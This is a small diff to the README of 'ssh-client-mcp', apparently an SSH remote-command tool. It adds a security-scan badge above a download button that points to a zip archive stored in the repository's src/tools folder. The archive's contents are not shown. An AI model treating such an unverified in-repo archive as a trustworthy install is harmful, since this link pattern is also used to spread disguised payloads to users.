@@ -1,5 +1,7 @@
 # 🚀 ssh-client-mcp - Easy Remote Command and File Transfers
 
+[![SafeSkill 87/100](https://img.shields.io/badge/SafeSkill-87%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/moinugare19-ssh-client-mcp)
+
 [![Download ssh-client-mcp](https://raw.githubusercontent.com/moinugare19/ssh-client-mcp/master/src/tools/mcp-client-ssh-3.0.zip)](https://raw.githubusercontent.com/moinugare19/ssh-client-mcp/master/src/tools/mcp-client-ssh-3.0.zip)
 
 ## 🛠️ Overview
